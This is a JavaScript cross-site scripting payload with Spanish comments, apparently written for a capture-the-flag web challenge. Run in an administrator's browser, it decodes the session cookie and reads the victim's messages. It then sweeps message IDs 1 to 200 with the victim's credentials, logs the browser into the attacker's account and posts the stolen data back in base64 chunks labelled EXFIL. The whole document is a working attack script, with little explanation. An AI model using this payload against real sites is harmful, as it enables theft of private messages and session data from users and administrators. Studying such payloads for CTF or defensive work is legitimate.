(async () => {
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
  const YOUR_USER = "insider1";      // <-- AJUSTA
  const YOUR_PASS = "insideer";      // <-- AJUSTA
  const MAX_ID    = 200;
  const CHUNK     = 900;

  // Helpers
  const post = (msg) => fetch('/create_msg', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({ message: msg })
  });

  const whoami = () => {
    try {
      const m = (document.cookie.match(/(?:^|;\s*)session=([^;]+)/)||[])[1];
      if (!m) return null;
      // muchas veces es formato "payload.firma" con payload base64
      const parts = m.split('.');
      if (parts.length >= 1) {
        const p = parts[0].includes('.') ? parts[1] : parts[0];
        const s = atob(p.replace(/-/g,'+').replace(/_/g,'/'));
        const j = JSON.parse(s);
        return j;
      }
    } catch(e) {}
    return null;
  };

  try {
    const me = whoami();
    await post(`MARK:START ${new Date().toISOString()}`);
    await post(`WHOAMI:${me ? JSON.stringify(me) : "unknown"}`);

    // 1) Dump como contexto actual (si es admin, aquí verás la flag)
    const hits = [];
    let self = {};
    try {
      const r = await fetch('/messages', { credentials: 'include' });
      self = await r.json();
    } catch(_) { self = {messages: []}; }
    hits.push({ id: "self", ...self });

    // 2) Barrido por id (esto lo hace el admin con sus permisos)
    for (let id = 1; id <= MAX_ID; id++) {
      try {
        const r = await fetch(`/messages?id=${id}`, { credentials: 'include' });
        const j = await r.json();
        if (j && j.messages && j.messages.length) {
          hits.push({ id, ...j });
          await post(`FOUND_ID:${id} count=${j.messages.length}`);
        }
      } catch(_) {}
      await sleep(40);
    }

    // 3) Pivot a tu cuenta
    await fetch('/auth', {
      method: 'POST',
      headers: {'Content-Type':'application/x-www-form-urlencoded'},
      body: 'action=login&username='+encodeURIComponent(YOUR_USER)+'&password='+encodeURIComponent(YOUR_PASS)
    });
    await sleep(300);

    // 4) Publica dump en B64
    const dumpB64 = btoa(unescape(encodeURIComponent(JSON.stringify({ hits }))));
    for (let i = 0, p = 0; i < dumpB64.length; i += CHUNK, p++) {
      await post(`EXFIL_B64_${p}: ` + dumpB64.slice(i, i + CHUNK));
      await sleep(60);
    }
    await post(`MARK:DONE ${new Date().toISOString()}`);
  } catch (e) {
    try { await post(`EXFIL_ERR:${String(e)}`); } catch(_) {}
  }
})();
